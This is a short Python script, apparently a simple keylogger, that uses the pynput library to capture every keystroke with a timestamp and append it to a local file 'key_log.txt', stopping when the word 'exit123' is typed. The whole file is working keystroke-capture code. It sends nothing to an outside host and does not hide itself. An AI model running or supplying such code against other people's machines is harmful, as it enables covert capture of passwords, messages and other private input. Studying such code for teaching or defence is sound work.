from pynput import keyboard
from datetime import datetime

log_file = "key_log.txt"
typed_keys = ""

open("key_log.txt", "w").close()

def on_press(key):
    global typed_keys
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        char = key.char
        typed_keys += char
        log = f"[{timestamp}] {char}\n"
    except AttributeError:
        log = f"[{timestamp}] [{key}]\n"

    with open(log_file, "a") as f:
        f.write(log)

    # Kill switch: Stop listener if "exit123" is typed
    if "exit123" in typed_keys:
        print("[INFO] Kill word detected. Exiting keylogger.")
        return False

# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
